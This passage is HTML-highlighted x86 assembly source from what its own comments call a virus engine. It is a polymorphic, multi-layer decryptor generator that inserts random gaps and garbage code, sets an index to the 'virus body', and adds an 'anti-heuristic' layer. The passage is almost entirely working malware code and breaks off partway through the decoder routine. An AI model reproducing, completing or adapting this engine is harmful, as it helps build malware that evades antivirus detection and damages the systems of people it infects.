    </span><span class="sc5">__pglg_exchange</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__pglg_exchange</span><span class="sc0">

        </span><span class="sc1">; generate random gaps</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000009h</span><span class="sc0">       </span><span class="sc1">;number of gaps - 1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_num</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;actual gaps</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;no gaps ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__pglg_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">__pglg_next_gap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_size</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;memory buffer size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;don't support 1st place</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__pglg_next_gap</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;save position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000010h</span><span class="sc0">       </span><span class="sc1">;&lt;0,10h) gap</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;this was fucking bug</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;and its size</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;next gap</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pglg_next_gap</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_num</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__pglg_moving</span><span class="sc0">

        </span><span class="sc1">; use "bubble sort"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_num</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;for(x=7;x&lt;=1;x--)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;for(y=8-x;y&lt;=1;y--)</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;if(p[y]&gt;p[y-1]){</span><span class="sc0">
    </span><span class="sc5">__pglg_bagain</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;x=p[y+1];p[y+1]=p[y]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;p[y]=x}</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">__pglg_bnext</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;...and it's all :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__pglg_bno_change</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__pglg_bno_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pglg_bnext</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pglg_bagain</span><span class="sc0">

        </span><span class="sc1">; it's time to do some place in the buffer</span><span class="sc0">
    </span><span class="sc5">__pglg_moving</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_num</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;number of gaps</span><span class="sc0">
    </span><span class="sc5">__pglg_next_moving</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_size</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;buffer's size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;position</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_map</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;memory layers map</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;gap size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__movsd_back</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;do some random movement</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get last bit (+/-) ?</span><span class="sc0">
    </span><span class="sc5">__pglg_generate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">       </span><span class="sc1">;generate that...</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">;to (C)arry</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__pglg_2nd</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01111111b</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__pglg_1st</span><span class="sc0">
        </span><span class="sc5">__pglg_2nd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10000000b</span><span class="sc0">        </span><span class="sc1">;set last bit</span><span class="sc0">
        </span><span class="sc5">__pglg_1st</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;...and store one</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__pglg_generate</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; well, build next anti-heuristic...</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_size</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; + gap size</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pglg_next_moving</span><span class="sc0">

        </span><span class="sc1">; change positions</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__pglg_cpos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_num</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;this was last fucking bug,</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;belive me, it's needless</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;to explain something :)</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__pglg_finish</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__pglg_cpos</span><span class="sc0">

    </span><span class="sc5">__pglg_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate code to set index for decode-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function gets start of virus body to reg32.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_index</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; crypt a start of decoding</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;start of decoding...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">     </span><span class="sc1">;go !</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">

        </span><span class="sc1">;  go back</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate layer pointer ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function generates pointer to a layers memory map.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__pglp_old_val</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;old random value</span><span class="sc0">
        </span><span class="sc5">__pglp_ov_where</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;pointer to update</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_layer_pointer</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; generate random pointer for layers map</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglp_old_val</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">         </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglp_ov_where</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; restore registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to build brute-multi-layer-poly decoder ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function generates the very perfect decryptor.</span><span class="sc0">
        </span><span class="sc1">;Scheme:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  @@1:  ROR   code_reg, 01h</span><span class="sc0">
        </span><span class="sc1">;    (ADD,SUB,XOR) [index_reg], code_reg</span><span class="sc0">
        </span><span class="sc1">;    DEC   index_reg</span><span class="sc0">
        </span><span class="sc1">;    TEST  [mlayer_reg], 80h</span><span class="sc0">
        </span><span class="sc1">;    JNZ   @@2</span><span class="sc0">
        </span><span class="sc1">;    INC   index_reg</span><span class="sc0">
        </span><span class="sc1">;    INC   index_reg</span><span class="sc0">
        </span><span class="sc1">;  @@2:  DEC   byte ptr [mlayer_reg]</span><span class="sc0">
        </span><span class="sc1">;    TEST  [mlayer_reg], 7Fh</span><span class="sc0">
        </span><span class="sc1">;    JNZ   @@1</span><span class="sc0">
        </span><span class="sc1">;    TEST  BYTE PTR [mlayer_reg],80h</span><span class="sc0">
        </span><span class="sc1">;    JNZ   @@3</span><span class="sc0">
        </span><span class="sc1">;    TEST  BYTE PTR [mlayer_reg+1],80H</span><span class="sc0">
        </span><span class="sc1">;    JZ    @@4</span><span class="sc0">
        </span><span class="sc1">;    DEC   index_reg</span><span class="sc0">
        </span><span class="sc1">;    JMP   @@4</span><span class="sc0">
        </span><span class="sc1">;  @@3:  TEST  BYTE PTR [mlayer_reg+1],80H</span><span class="sc0">
        </span><span class="sc1">;    JNZ   @@4</span><span class="sc0">
        </span><span class="sc1">;    INC   index_reg</span><span class="sc0">
        </span><span class="sc1">;  @@4:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;And it is whole decryptor, very easy to understand... :)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_decoder</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; build sado-maso decoder :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;"go back" offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decoder_back</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; rotate by code_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C8D1h</span><span class="sc0">       </span><span class="sc1">;ROR code_reg, 01h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; select type of coding (ADD, SUB, XOR) ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__pd_xor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pd_select_regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">          </span><span class="sc1">;SUB instruction</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__pd_select_regs</span><span class="sc0">
    </span><span class="sc5">__pd_xor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">          </span><span class="sc1">;XOR instruction</span><span class="sc0">
    </span><span class="sc5">__pd_select_regs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;code register</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;index register</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; change index register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">          </span><span class="sc1">;DEC instruction</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;index register</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; move down or up ? (+/-) flag</span><span class="sc0">
